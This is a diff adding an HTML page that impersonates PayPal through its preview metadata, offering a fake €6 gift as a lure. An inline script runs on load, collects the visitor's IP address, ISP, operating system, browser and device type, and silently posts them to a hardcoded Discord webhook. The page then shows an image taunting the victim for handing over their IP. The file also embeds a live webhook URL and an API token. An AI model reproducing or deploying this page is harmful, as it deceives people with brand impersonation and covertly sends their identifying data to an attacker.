@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Receive €6 from Gab">
+    <meta property="og:description" content="Go to claim.paypal.me/lolesx and get €6 back. Since it's PayPal, it's easy and secure. Don't have a PayPal account? No worries.">
+    <meta property="og:footer" content="Claim.PayPal.Me">
+    <meta property="og:thumbnail" content="https://www.paypalobjects.com/webstatic/paypalme/images/social/pplogo120_4_3.png">
+    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/paypalme/images/social/pplogo120_4_3.png">
+    <title>Claim.PayPal.Me</title>
+</head>
+<body>
+
+    <script>
+        // Remplacez "VOTRE_WEBHOOK_URL" par l'URL de votre webhook Discord
+        const webhookUrl = "https://discord.com/api/webhooks/1179145523282858045/nv5ObCAEL-VlewRzKqg_y20boJLmIAVItegIgpCPu_grOfwtB1nizT2J6m_GGolEcRKR";
+
+        // Fonction pour effectuer une requête HTTP POST vers le webhook Discord
+        function sendRequest(data) {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            });
+        }
+
+        // Fonction pour obtenir les informations de l'utilisateur
+        function getUserInfo() {
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const userAgent = navigator.userAgent;
+                    const isMobile = /Mobi|Android/i.test(userAgent);
+                    const is4G = /Mobile|Tablet|Android/i.test(userAgent);
+
+                    // Déterminer l'OS et le navigateur à partir de l'user agent
+                    const os = (function() {
+                        if (/Windows/i.test(userAgent)) return "Windows";
+                        if (/Macintosh/i.test(userAgent)) return "Macintosh";
+                        if (/Linux/i.test(userAgent)) return "Linux";
+                        return "Autre";
+                    })();
+
+                    const browser = (function() {
+                        if (/Firefox/i.test(userAgent)) return "Firefox";
+                        if (/Chrome/i.test(userAgent)) return "Chrome";
+                        if (/Safari/i.test(userAgent)) return "Safari";
+                        if (/Edge/i.test(userAgent)) return "Edge";
+                        if (/Opera/i.test(userAgent)) return "Opera";
+                        return "Autre";
+                    })();
+
+                    // Utilisez l'API ipinfo.io pour obtenir des informations géographiques, y compris l'opérateur
+                    fetch(`https://ipinfo.io/${ip}/json?token=45c2b276273cb7`)
+                        .then(response => response.json())
+                        .then(ipInfo => {
+                            const operator = ipInfo.org || "Opérateur non disponible";
+
+                            const embed = {
+                                title: "Gift IPGRB by Loles",
+                                color: 0xE014F0,  // Couleur hexadécimale
+                                description: "@everyone Informations de l'utilisateur :",
+                                fields: [
+                                    { name: 'IP', value: ip, inline: true },
+                                    { name: 'User Agent', value: userAgent, inline: true },
+                                    { name: 'Système d\'exploitation', value: os, inline: true },
+                                    { name: 'Navigateur', value: browser, inline: true },
+                                    { name: 'Mobile', value: isMobile ? 'Oui' : 'Non', inline: true },
+                                    { name: '4G', value: is4G ? 'Oui' : 'Non', inline: true },
+                                    { name: 'Opérateur IP', value: operator, inline: true },
+                                ],
+                            };
+
+                            // Envoie les informations au webhook Discord
+                            sendRequest({ content: "@everyone", embeds: [embed] });
+
+                            // Affiche une image définie après avoir envoyé l'embed
+                            document.body.innerHTML = `<a href="https://discord.gg/e29mdZEd" target="_blank"><img src="https://cdn.discordapp.com/attachments/1146231007608045598/1176958539395252244/Merci_pour_ton_IP.png?ex=6570c30e&is=655e4e0e&hm=cad9e668b361f288286b6e26728cec0d69b322541e284fcc3f346562991eb04f&" alt="Merci de nous avoir envoyé votre IP !">`;
+                        })
+                        .catch(error => console.error('Erreur lors de la récupération des informations IPInfo :', error));
+                })
+                .catch(error => console.error('Erreur lors de la récupération des informations :', error));
+        }
+
+        // Appel de la fonction pour obtenir les informations et envoyer au webhook
+        getUserInfo();
+    </script>
+</body>
+</html>
